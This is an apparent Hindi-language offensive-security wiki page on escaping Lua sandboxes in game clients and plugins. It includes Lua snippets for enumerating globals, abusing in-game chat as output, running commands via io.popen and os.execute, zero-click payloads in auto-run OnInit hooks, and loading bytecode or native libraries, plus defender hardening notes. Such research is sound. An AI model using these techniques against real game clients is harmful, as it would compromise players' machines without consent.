# Lua sandboxes को बायपास करना (embedded VMs, game clients)

यह पेज applications में embedded Lua "sandboxes" (विशेष रूप से game clients, plugins या in-app scripting engines) को enumerate करने और उनमें से बाहर निकलने की practical techniques संकलित करता है। कई engines एक restricted Lua environment expose करते हैं, लेकिन ऐसे powerful globals उपलब्ध छोड़ देते हैं जो arbitrary command execution या bytecode loaders expose होने पर native memory corruption तक सक्षम कर सकते हैं।

मुख्य विचार:
- VM को एक अज्ञात environment मानें: _G को enumerate करें और पता लगाएँ कि कौन-से dangerous primitives reachable हैं।
- जब stdout/print blocked हो, तो results देखने के लिए किसी भी in-VM UI/IPC channel का output sink के रूप में दुरुपयोग करें।
- यदि io/os exposed है, तो अक्सर आपके पास direct command execution होता है (io.popen, os.execute)।
- यदि load/loadstring/loadfile exposed हैं, तो crafted Lua bytecode execute करने से कुछ versions में memory safety को subvert किया जा सकता है (≤5.1 verifiers को bypass किया जा सकता है; 5.2 में verifier हटा दिया गया), जिससे advanced exploitation संभव होता है।

## Sandboxed environment को enumerate करना

- Reachable tables/functions की inventory बनाने के लिए global environment dump करें:
```lua
-- Minimal _G dumper for any Lua sandbox with some output primitive `out`
local function dump_globals(out)
out("=== DUMPING _G ===")
for k, v in pairs(_G) do
out(tostring(k) .. " = " .. tostring(v))
end
end
```
- यदि कोई print() उपलब्ध नहीं है, तो in-VM channels का पुनःउपयोग करें। MMO housing script VM से लिए गए उदाहरण में, chat output केवल sound call के बाद काम करता है; निम्नलिखित एक विश्वसनीय output function बनाता है:<sup>[[1]](#references)</sup>
```lua
-- Build an output channel using in-game primitives
local function ButlerOut(label)
-- Some engines require enabling an audio channel before speaking
H.PlaySound(0, "r[1]") -- quirk: required before H.Say()
return function(msg)
H.Say(label or 1, msg)
end
end

function OnMenu(menuNum)
if menuNum ~= 3 then return end
local out = ButlerOut(1)
dump_globals(out)
end
```
अपने target के लिए इस pattern को generalize करें: कोई भी textbox, toast, logger या UI callback जो strings स्वीकार करता है, reconnaissance के लिए stdout की तरह काम कर सकता है।

## Direct command execution if io/os is exposed

यदि sandbox अभी भी standard libraries io या os को expose करता है, तो संभवतः आपके पास तुरंत command execution है:
```lua
-- Windows example
io.popen("calc.exe")

-- Cross-platform variants depending on exposure
os.execute("/usr/bin/id")
io.popen("/bin/sh -c 'id'")
```
नोट्स:

- Execution client process के अंदर होता है; external debuggers को block करने वाली कई anti-cheat/antidebug layers in-VM process creation को नहीं रोकेंगी।
- यह भी जाँचें: package.loadlib (arbitrary DLL/.so loading), native modules के साथ require, LuaJIT का ffi (यदि मौजूद हो), और debug library (जो VM के अंदर privileges बढ़ा सकती है)।

## auto-run callbacks के ज़रिए Zero-click triggers

यदि host application clients को scripts भेजता है और VM auto-run hooks (जैसे, OnInit/OnLoad/OnEnter) expose करता है, तो script load होते ही drive-by compromise के लिए अपना payload वहाँ रखें:<sup>[[1]](#references)</sup>
```lua
function OnInit()
io.popen("calc.exe") -- or any command
end
```
कोई भी equivalent callback (OnLoad, OnEnter, आदि) इस technique को generalize करता है, जब scripts client पर automatically transmit और execute की जाती हैं।

## Recon के दौरान hunt किए जाने वाले dangerous primitives

_G enumeration के दौरान, विशेष रूप से इनकी तलाश करें:
- io, os: io.popen, os.execute, file I/O, env access।
- load, loadstring, loadfile, dofile: source या bytecode execute करते हैं; untrusted bytecode loading को support करते हैं।
- package, package.loadlib, require: dynamic library loading और module surface।
- debug: setfenv/getfenv (≤5.1), getupvalue/setupvalue, getinfo और hooks।
- केवल LuaJIT: native code को directly call करने के लिए ffi.cdef, ffi.load।

Minimal usage examples (यदि reachable हों):

Lua का loader API versions के बीच बदल गया है: Lua 5.1 में, `load` reader function से पढ़ता है और `loadstring` string से पढ़ता है; Lua 5.2 का `load` string या reader function, दोनों में से किसी को accept करता है, और `loadstring` को इसके equivalent के रूप में deprecated किया गया है।<sup>[[5]](#references)[[6]](#references)</sup>
```lua
-- Lua 5.2+ source loader; Lua 5.1 use loadstring("return 1+1")
local f = load("return 1+1")
print(f()) -- 2

-- Lua 5.1 string/bytecode loader
local bc = string.dump(function() return 0x1337 end)
local g = loadstring(bc) -- in 5.1 may run precompiled bytecode
print(g())

-- Load native library symbol (if allowed)
local mylib = package.loadlib("./libfoo.so", "luaopen_foo")
local foo = mylib()
```
## वैकल्पिक escalation: Lua bytecode loaders का दुरुपयोग

जब load/loadstring/loadfile reachable हों, लेकिन io/os restricted हों, तब crafted Lua bytecode का execution memory disclosure और corruption primitives तक ले जा सकता है। मुख्य तथ्य:
- Lua ≤ 5.1 में एक bytecode verifier शामिल था, जिसके ज्ञात bypasses हैं।<sup>[[4]](#references)</sup>
- Lua 5.2 ने verifier को पूरी तरह हटा दिया (official stance: applications को precompiled chunks को सीधे reject करना चाहिए), जिससे bytecode loading prohibited न होने पर attack surface बढ़ जाता है।<sup>[[2]](#references)[[3]](#references)</sup>
- Workflows आमतौर पर इस प्रकार होते हैं: in-VM output के माध्यम से pointers leak करना, type confusions उत्पन्न करने के लिए bytecode तैयार करना (जैसे FORLOOP या अन्य opcodes के आसपास), फिर arbitrary read/write या native code execution तक pivot करना।<sup>[[2]](#references)[[4]](#references)</sup>

यह path engine/version-specific है और RE की आवश्यकता होती है। गहन विश्लेषण, exploitation primitives और games में example gadgetry के लिए references देखें।

## Detection और hardening notes (defenders के लिए)

- Server side: user scripts को reject या rewrite करें; safe APIs को allowlist करें; io, os, load/loadstring/loadfile/dofile, package.loadlib, debug, ffi को strip करें या empty bindings से bind करें।
- Client side: Lua को minimal _ENV के साथ चलाएं, bytecode loading को forbid करें, strict bytecode verifier या signature checks को फिर से लागू करें, और client process से process creation को block करें।
- Telemetry: script load के तुरंत बाद gameclient → child process creation होने पर alert करें; इसे UI/chat/script events के साथ correlate करें।

## References

- [1] [This House is Haunted: AION client में एक दशक पुराना RCE (housing Lua VM)](https://appsec.space/posts/aion-housing-exploit/)
- [2] [Bytecode Breakdown: Factorio की Lua Security Flaws का विश्लेषण](https://memorycorruption.net/posts/rce-lua-factorio/)
- [3] [lua-l (2009): bytecode verifier को हटाने पर Discussion](https://web.archive.org/web/20230308193701/https://lua-users.org/lists/lua-l/2009-03/msg00039.html)
- [4] [Lua 5.1 bytecode का Exploiting (verifier bypasses/notes वाला gist)](https://gist.github.com/ulidtko/51b8671260db79da64d193e41d7e7d16)
- [5] [Lua 5.1 Reference Manual](https://www.lua.org/manual/5.1/manual.html#pdf-loadstring)
- [6] [Lua 5.2 Reference Manual](https://www.lua.org/manual/5.2/manual.html#pdf-load)
{{#include ../../../banners/hacktricks-training.md}}
